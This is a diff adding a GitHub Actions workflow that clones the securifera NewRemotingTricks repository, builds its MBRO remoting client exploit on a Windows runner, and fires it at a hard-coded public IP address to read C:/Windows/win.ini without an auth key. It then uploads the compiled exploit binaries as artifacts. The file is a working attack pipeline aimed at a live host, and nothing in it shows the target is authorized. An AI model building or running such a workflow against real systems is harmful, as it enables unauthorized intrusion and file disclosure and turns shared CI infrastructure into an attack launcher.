@@ -1,0 +1,47 @@
+name: Build securifera MBRO exploit
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Clone securifera NewRemotingTricks
+        run: |
+          git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+          cd C:\exploit
+          dir
+
+      - name: Build RemotingClient_MBRO
+        run: |
+          cd C:\exploit
+          # Find and build the MBRO client
+          $proj = Get-ChildItem -Recurse -Filter "*.csproj" | Where-Object {$_.Name -match "MBRO|Client"}
+          Write-Host "Projects found:"
+          $proj | Select FullName
+          
+          foreach ($p in $proj) {
+            Write-Host "Building $($p.FullName)"
+            dotnet build $p.FullName -c Release 2>&1 | Select-String -Pattern "error|warning|Build succeeded|FAILED" | Select-Object -Last 10
+          }
+
+      - name: Try file read against target
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter "RemotingClient*.exe" | Select-Object -First 1
+          if ($exe) {
+            Write-Host "Found exe: $($exe.FullName)"
+            # Try reading win.ini - no AuthKey first
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1 | Select-Object -First 30
+          } else {
+            Write-Host "No exe found - listing bin dirs:"
+            Get-ChildItem -Recurse -Filter "*.exe" | Where-Object {$_.Name -notmatch "dotnet|msbuild"} | Select FullName
+          }
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-exploit
+          path: |
+            C:\exploit\**\bin\**\*.exe
+            C:\exploit\**\bin\**\*.dll
+            C:\exploit\**\*.xaml.xml
+            C:\exploit\**\*.py
